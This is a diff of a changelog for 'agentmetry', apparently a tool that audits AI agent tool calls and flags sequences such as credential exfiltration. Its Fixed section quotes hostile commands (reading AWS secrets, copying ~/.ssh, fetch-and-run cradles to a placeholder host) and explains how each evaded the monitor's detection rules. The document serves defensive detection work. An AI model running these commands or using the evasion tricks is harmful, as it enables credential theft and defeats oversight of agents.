@@ -9,37 +9,60 @@ separately (currently `1.1.0`) and changes additively.
 
 ## [Unreleased]
 
-## [0.4.0] - 2026-08-03
+## [0.4.0] - 2026-08-07
 
-### Changed
-- **Everything moved under one top-level `agentmetry` package, and the
-  distribution is now `agentmetry` rather than `agentmetry-orchestrator`.**
-  `pip install` previously would have written `core`, `api` and `cli` into
-  site-packages: three of the most generic importable names in Python, colliding
-  with whatever else claims them. Imports change from `core.audit...` to
-  `agentmetry.core.audit...`. Breaking, and the reason this is a minor bump
-  rather than a patch.
+**The first release you can actually `pip install`.** Every earlier version
+either was never published or, in 0.3.0's case, would have written `core`, `api`
+and `cli` into site-packages. `pip install agentmetry` now works, and
+`agentmetry doctor` opens with no failures on a clean install.
 
-  The version moves with it. Tag `v0.3.0` points at the old flat layout, so
-  publishing 0.3.0 to PyPI would have made one version number mean two different
-  trees, and evidence packs record the producing version. `meta.producer` now
-  reads `agentmetry/0.4.0`.
-
-  The policy manifests moved inside the package too, for the same reason and
-  with a sharper edge: without them DLP, tool policy and the YAML detection
-  rules are all inert, so `pip install` produced a `doctor` opening with three
-  FAILs and secret scanning silently off. They now live at
-  `agentmetry/policies/`. `python -m build` builds the wheel from the sdist, and
-  a force-include reaching outside the project directory does not survive that
-  trip, so config the package needs to run had to live with the package.
-
-  The detection corpus moved inside the package. `agentmetry benchmark` is the
-  command the README tells a stranger to run to check the false-positive claim,
-  and it failed from a clean install because the corpus lived under `tests/`,
-  which no wheel ships.
-
+Published by a tagged GitHub Actions run using PyPI Trusted Publishing, which
+means the artifact is built from a clean checkout of the tag rather than from
+whatever happened to be in a laptop's `dist/`. That is not process theatre: the
+artifacts nearly published by hand were four days old and carried 20 corpus
+files against a tree with 46, missing every detection fix below.
 
 ### Added
+- **Merkle inclusion proofs over the trail.** The hash chain answers "has this
+  file been altered". It cannot answer "did this event happen" without handing
+  over the whole file, because every record's hash depends on the one before it.
+  For an audit that is the wrong shape: proving one tool call should not
+  disclose a month of unrelated work.
+
+  `agentmetry prove <trail> --seq N` emits an RFC 6962 inclusion proof;
+  `--check` verifies one, ideally against a root recorded elsewhere. On a real
+  trail that is 1.2 KB against 8.3 MB. `verify --trail` now prints the root.
+
+  Additive by construction: leaves are the `record_sha256` values the chain
+  already writes, so every trail ever produced is compatible and nothing
+  migrates. Leaf and internal nodes are domain-separated (RFC 6962 §2.1) and the
+  tree splits at the largest power of two below `n` rather than padding or
+  duplicating the final node; without those two properties an internal node can
+  be presented as a leaf, and two different logs can share a root.
+
+  It does not solve external anchoring (#34). A root only you hold is still a
+  file you could rewrite, and `--check` says so rather than implying otherwise.
+
+- **CloudEvents v1.0 export.** `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=cloudevents`
+  wraps each event in a structured envelope for Knative, EventBridge, Event
+  Grid, Dapr or Kafka. The canonical event travels whole in `data`. Default
+  stays `canonical`, because an option appearing must not change the shape an
+  already-wired webhook receives.
+
+- **Ingest Microsoft Agent Governance Toolkit audit files.**
+  `agentmetry import-agt <file> --key K` verifies AGT's hash chain and HMAC
+  signatures, then runs sequence detection over it. AGT decides allow or deny
+  per call; this says what a session of those calls adds up to. On a file
+  produced by AGT's own `FileAuditSink`, three individually-permitted calls
+  raised one critical `credential-exfil`.
+
+  Verified before ingest, never after: appending an unchecked record into a
+  hash-chained trail would make the chain vouch for a claim nobody checked.
+  Ingested events carry `source.tier=external` and
+  `provenance.captured_by=agent-governance-toolkit`, because Agentmetry read
+  that record rather than observing the calls, and a trail that cannot tell the
+  difference asserts more than it knows.
+
 - **The dogfood gate now notices when the rules changed underneath it.**
   `dogfood --start` records a fingerprint of everything that decides whether a
   detection fires and how hard: the detection engine, rules, traits and MITRE
@@ -57,7 +80,88 @@ separately (currently `1.1.0`) and changes additively.
   edit, and it cannot miss a real change. A marker written before fingerprints
   existed is treated as unknown rather than drifted.
 
+- **Spool depth and age are now visible.** `GET /api/v1/audit/status` reports
+  `spool_pending` and `spool_oldest_age_seconds`; `doctor` **fails** above 100
+  pending or 24h old, naming how long remains before the oldest become
+  unreplayable; and the dashboard's feed status bar replaces the freshness label
+  with a pending-replay count. "Last event 2m ago" beside a thousand unreplayed
+  events is a true statement that leaves a false impression.
+
+- **`agentmetry dogfood`** — scores the four-week beta gate from the trail.
+  A week is green when the recorder ran on at least three days, the chain
+  verifies, every critical or high detection was dispositioned, and nothing is
+  stuck in the hook spool. `--start` records the clock.
+
+  The gate went unstarted for weeks, and the reason was mechanical rather than
+  motivational: answering "was this week green?" meant a twenty-minute manual
+  checklist, so it never got asked. This makes it one command. Volume is
+  deliberately not a criterion; a slow week is fine, a week the recorder missed
+  is not, because an empty trail from a switched-off recorder looks exactly like
+  an empty trail from a quiet developer.
+- **Dashboard dogfood gate + Analytics drill-down.** Clickable weekly stats
+  (Denied / DLP / Policy / Detections) open Event stream or Detections with
+  server-side `GET /audit/tail?focus=…` over the last 7 days, so counts match
+  visible rows. Fleet vs this-session scope toggle; hunt focus survives tab
+  switches until Clear.
+- **`GET /audit/tail?focus=`** — `denied` | `dlp` | `policy` | `detection`,
+  sharing the same SQL predicates as `/audit/stats`.
+
 ### Fixed
+- **The detection engine had systematic evasion holes** (#40, #41, #42, #43).
+  None exotic; each took under a minute to construct, and all four were found by
+  auditing the engine rather than by a detection firing:
+
+  - `echo $AWS_SECRET_ACCESS_KEY` was generic Execution. Credential recognition
+    described only file paths, so the way every container and CI runner holds
+    secrets was invisible and `credential-exfil` could not fire on the modal
+    cloud exfil chain.
+  - `python -c "urllib.request.urlopen(...)"` earned no egress tag. The network
+    client list was curl, wget, nc and friends; in a hardened image curl is
+    often absent and a language runtime never is.
+  - `bash <(curl -fsSL ...)` fetches and executes with no pipe, so every cradle
+    check looking for `|` missed it.
+  - `cp -r ~/.ssh /tmp/k` produced no traits at all. The private-key pattern
+    required a separator after `.ssh`, so a named key matched and the directory
+    holding every key did not, which made the broadest theft the one that got
+    through.
+  - `credential-exfil` could not fire when the read and the send were one
+    command, because it only looked at events *after* the credential read.
+  - `remote-staging-then-execute` knew seven staging hosts, and a domain costs a
+    few euros. It now matches any remote host when the downloaded basename is
+    the executed basename: not "fetched something, later ran something", which
+    is a working day, but "ran the thing just fetched".
+
+  Underneath sat the real defect: credential recognition existed twice, and the
+  sequence rules read only the MITRE tag, so the mapper was the only opinion
+  that counted while being the one with less information and no corpus. A bare
+  `.env` in its pattern list tagged the module path
+  `agentmetry.core.diagnostics.env_file` as credential access and manufactured
+  the credential half of two critical findings. `traits.py` owns the patterns
+  now and `mitre.py` imports them.
+
+- **False positives on writing about security** (#24, #41). Trait regexes match
+  command text and cannot tell performing an action from writing about one.
+  Matching now follows shell semantics: the verb must be unmasked, the arguments
+  may be quoted. `echo 'curl x | bash' >> notes.md` and
+  `git commit -m "docs: explain .env handling"` stay silent, while
+  `curl "https://host/x.sh" | bash` still fires, because quoting a URL is simply
+  how people write it.
+
+- **Autostart was registered and failing.** The scheduled task still launched
+  `-m cli serve`, a module the package rename had removed, so it exited 1 every
+  sixty seconds while `doctor` reported OK and 60 events piled up in the spool.
+  `doctor` now fails a registration that does not work, and
+  `agentmetry install` no longer answers "already configured" to a broken one.
+  Health is read from the task's status rather than its last result, because a
+  long-running task logs a non-zero result on every keep-alive tick.
+
+- **Eight launchers still named pre-rename modules** (`scripts/agentmetry.bat`,
+  `install.ps1`, four `.bat` files, `seed_demo.py`, `.claude/launch.json`). A
+  module path inside a string is invisible to the type checker, the linter and
+  the import system alike, so each waited for a human to trip over it. A test
+  now walks every launcher and asks the import system whether the module
+  resolves; it found two that a grep had missed.
+
 - **Writing `gh pr merge` into a file read as merging a pull request** (#24).
   A command whose *content* was `gh pr merge 42 --squash` fired
   `pr-merged-without-review` at critical. Nothing was merged: the text was being
@@ -170,32 +274,48 @@ separately (currently `1.1.0`) and changes additively.
   would race it. `doctor` now warns when nothing will restart the recorder and
   names the command that fixes it.
 
-### Added
-- **Spool depth and age are now visible.** `GET /api/v1/audit/status` reports
-  `spool_pending` and `spool_oldest_age_seconds`; `doctor` **fails** above 100
-  pending or 24h old, naming how long remains before the oldest become
-  unreplayable; and the dashboard's feed status bar replaces the freshness label
-  with a pending-replay count. "Last event 2m ago" beside a thousand unreplayed
-  events is a true statement that leaves a false impression.
+### Changed
+- **Detection corpus grows from 20 cases to 46** (22 benign, up from 6). Seven
+  benign sessions put a 95% confidence bound on the false-positive rate at
+  roughly 41%, which is not a rate, and it was the weakest number in the README.
+  It is now about 19%. Rule coverage goes from 9 of 15 to 13.
 
-- **`agentmetry dogfood`** — scores the four-week beta gate from the trail.
-  A week is green when the recorder ran on at least three days, the chain
-  verifies, every critical or high detection was dispositioned, and nothing is
-  stuck in the hook spool. `--start` records the clock.
+  Every new attack case is paired with the near-miss that must stay silent:
+  autonomous writes before an approval against the same writes after one; three
+  deletions against the five-deletion threshold; fetch-then-egress against
+  fetch-then-edit; downloading a file and running it against downloading a
+  schema and running a repo script. A threshold that drifts now breaks a benign
+  case instead of surfacing quietly in production.
 
-  The gate went unstarted for weeks, and the reason was mechanical rather than
-  motivational: answering "was this week green?" meant a twenty-minute manual
-  checklist, so it never got asked. This makes it one command. Volume is
-  deliberately not a criterion; a slow week is fine, a week the recorder missed
-  is not, because an empty trail from a switched-off recorder looks exactly like
-  an empty trail from a quiet developer.
-- **Dashboard dogfood gate + Analytics drill-down.** Clickable weekly stats
-  (Denied / DLP / Policy / Detections) open Event stream or Detections with
-  server-side `GET /audit/tail?focus=…` over the last 7 days, so counts match
-  visible rows. Fleet vs this-session scope toggle; hunt focus survives tab
-  switches until Clear.
-- **`GET /audit/tail?focus=`** — `denied` | `dlp` | `policy` | `detection`,
-  sharing the same SQL predicates as `/audit/stats`.
+  `corpus.yaml` states what the number is: a regression guard that the rules
+  stay quiet on ordinary work, not a field false-positive rate. The field rate
+  is what the dogfood run reports, over traffic nobody chose.
+
+- **Everything moved under one top-level `agentmetry` package, and the
+  distribution is now `agentmetry` rather than `agentmetry-orchestrator`.**
+  `pip install` previously would have written `core`, `api` and `cli` into
+  site-packages: three of the most generic importable names in Python, colliding
+  with whatever else claims them. Imports change from `core.audit...` to
+  `agentmetry.core.audit...`. Breaking, and the reason this is a minor bump
+  rather than a patch.
+
+  The version moves with it. Tag `v0.3.0` points at the old flat layout, so
+  publishing 0.3.0 to PyPI would have made one version number mean two different
+  trees, and evidence packs record the producing version. `meta.producer` now
+  reads `agentmetry/0.4.0`.
+
+  The policy manifests moved inside the package too, for the same reason and
+  with a sharper edge: without them DLP, tool policy and the YAML detection
+  rules are all inert, so `pip install` produced a `doctor` opening with three
+  FAILs and secret scanning silently off. They now live at
+  `agentmetry/policies/`. `python -m build` builds the wheel from the sdist, and
+  a force-include reaching outside the project directory does not survive that
+  trip, so config the package needs to run had to live with the package.
+
+  The detection corpus moved inside the package. `agentmetry benchmark` is the
+  command the README tells a stranger to run to check the false-positive claim,
+  and it failed from a clean install because the corpus lived under `tests/`,
+  which no wheel ships.
 
 ## [0.3.0] - 2026-07-26
 
